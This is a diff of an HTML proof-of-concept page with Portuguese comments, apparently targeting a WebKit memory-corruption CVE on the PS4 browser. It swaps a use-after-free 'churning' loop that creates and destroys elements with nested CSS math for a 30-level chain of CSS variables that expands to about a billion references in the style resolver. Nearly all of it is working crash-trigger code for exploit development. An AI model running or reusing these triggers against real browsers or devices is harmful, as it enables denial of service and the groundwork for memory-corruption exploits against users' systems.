@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — UAF Churning</title>
+<title>CVE-2025-43535 PoC — CSS Var Compression</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Churning (Caçando o UAF)</h3>
+<h3>CVE-2025-43535 — Memory Corruption (CSS Var Expansion)</h3>
 <div id="log"></div>
 
 <script>
@@ -22,80 +22,68 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Nesta estratégia, pausas são curtas apenas para evitar freeze da UI, 
-// pois QUEREMOS que o Garbage Collector se atropele
-const yieldRace = () => new Promise(r => setTimeout(r, 0)); 
+const yieldGC = () => new Promise(r => setTimeout(r, 100));
 
-async function trigger_uaf_churn() {
-  L("[V1] Gerando payload matemático seguro (Nível 22)...");
+async function trigger_css_var_expansion() {
+  L("[V1] Iniciando Expansão por Variáveis CSS...");
 
-  // Mantemos o cache para não gastar CPU do JS, queremos estressar o C++
-  const mathCache = {};
-  function makeMathNested(depth) {
-    if (depth <= 0) return 'var(--dyn-val, 10px)'; // Introduzindo variável dinâmica
-    if (mathCache[depth]) return mathCache[depth];
+  const el = document.createElement('div');
+  el.style.position = 'absolute';
+  document.body.appendChild(el);
 
+  // Define a base
+  el.style.setProperty('--v0', '15px');
+
+  // Nível 30 de expansão = 2^30 referências (Mais de 1 bilhão de nós no C++)
+  // O JavaScript gasta zero memória pra montar isso.
+  const max_depth = 30; 
+
+  L(`[V1] Montando a cadeia de referências até o nível ${max_depth}...`);
+  for (let i = 1; i <= max_depth; i++) {
+    // Cada variável chama a anterior duas vezes. 
+    // Ex: --v5 será min(var(--v4), var(--v4))
+    const prev = `var(--v${i-1})`;
+    
+    // Alternamos as funções matemáticas para manter a complexidade do parser
     const funcs = ['min', 'max', 'clamp'];
-    const f = funcs[depth % 3];
-    let result = '';
-
+    const f = funcs[i % 3];
+    
+    let expr = '';
     if (f === 'clamp') {
-      result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+      expr = `clamp(${prev}, ${i * 5}px, ${prev})`;
     } else {
-      result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
+      expr = `${f}(${prev}, ${prev})`;
     }
 
-    mathCache[depth] = result;
-    return result;
+    el.style.setProperty(`--v${i}`, expr);
   }
 
-  // Nível 22 é seguro e não causa OOM no PS4, mas é complexo o suficiente para o parser
-  const safePayload = makeMathNested(22); 
-  const container = document.createElement('div');
-  document.body.appendChild(container);
+  L("[V1] Cadeia de variáveis montada no DOM. Tamanho no JS: Irrisório.", "ok");
+  await yieldGC();
 
-  L("[V1] Iniciando ciclo de Memory Churning (Criar -> Layout -> Destruir)...");
+  L("[V1] ATENÇÃO: Disparando o gatilho no C++ do WebKit...");
+  await new Promise(r => requestAnimationFrame(r));
 
-  // Fazemos 200 ciclos de alocação/liberação agressiva
-  for (let ciclo = 0; ciclo < 200; ciclo++) {
-    try {
-      // 1. Cria 5 elementos simultâneos
-      for (let i = 0; i < 5; i++) {
-        let el = document.createElement('div');
-        el.style.position = 'absolute';
-        // Alterna variáveis CSS no meio do cálculo para confundir o resolver
-        el.style.setProperty('--dyn-val', (ciclo % 2 === 0) ? '15px' : '5vw');
-        el.style.width = safePayload; 
-        container.appendChild(el);
-      }
-
-      // 2. Força o WebKit (C++) a processar toda a matemática AGORA
-      void container.offsetWidth; 
-
-      // 3. Destrói tudo imediatamente enquanto o C++ ainda pode estar lidando com nós internos
-      container.innerHTML = ''; 
-      
-      // 4. Força um novo layout na árvore vazia
-      void container.offsetWidth;
-
-      if (ciclo % 20 === 0) {
-        L(`[V1] Ciclo de agitação ${ciclo}/200 concluído.`);
-        await yieldRace(); // Respiro microscópico
-      }
-    } catch(e) {
-      L(`[V1] Exceção no ciclo ${ciclo}: ${e}`, "fail");
-    }
+  try {
+    // O momento da verdade. O Style Resolver do PS4 vai tentar calcular --v30
+    el.style.width = `var(--v${max_depth})`;
+    
+    // Força o cálculo síncrono
+    void el.offsetWidth; 
+    
+    L(`[V1] Sobreviveu à expansão máxima!`, "ok");
+  } catch(e) {
+    L(`[V1] Erro na resolução: ${e}`, "fail");
   }
 
-  document.body.removeChild(container);
-  L("[V1] Churning Finalizado. Se o WebKit tem um UAF aqui, ele deve cair agora.", "ok");
+  document.body.removeChild(el);
+  L("[V1] Teste de expansão finalizado.", "ok");
 }
 
 async function main() {
   try {
-    await trigger_uaf_churn();
+    await trigger_css_var_expansion();
     L("=== FIM DA EXECUÇÃO ===", "ok");
-    L("Caso não crashe, o trigger exato do CVE pode depender das Variantes 3 ou 4 originais.", "info");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
